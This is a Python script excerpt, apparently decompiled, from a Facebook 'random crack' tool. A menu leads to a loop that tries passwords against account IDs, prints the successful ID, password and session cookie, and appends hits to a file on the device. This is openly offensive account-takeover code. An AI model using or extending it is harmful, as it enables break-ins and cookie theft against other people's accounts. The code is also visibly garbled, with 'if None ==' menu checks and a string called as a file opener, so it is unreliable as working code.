...
def o():
    ...
    logo()
    print('\033[1;32m─────────────────────────────────────────────────────────')
    saimun('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
    saimun('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m Contact Me Facebook')
    saimun('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m Join Facebook Group ')
    saimun('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m Follow Page ')
    saimun('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        _HERON_('xdg-open https://www.facebook.com/saimun.salamhridoy.1')
        return None
    if None == '3':
        _HERON_('xdg-open https://facebook.com/groups/197651524092486/')
        return None
    if None == '4':
        _HERON_('xdg-open https://www.facebook.com/dedsecofficial007')
        return None
    if None == '0':
        _HERON_('exit')
        return None
...
def i():
    ...
    print('IDS SAVED IN SAIMUN-HRIDOY-OK.txt, SAIMUN-HRIDOY-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mHERON-AFRAID-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/HERON-AFRAID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[HERON-AFRAID] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
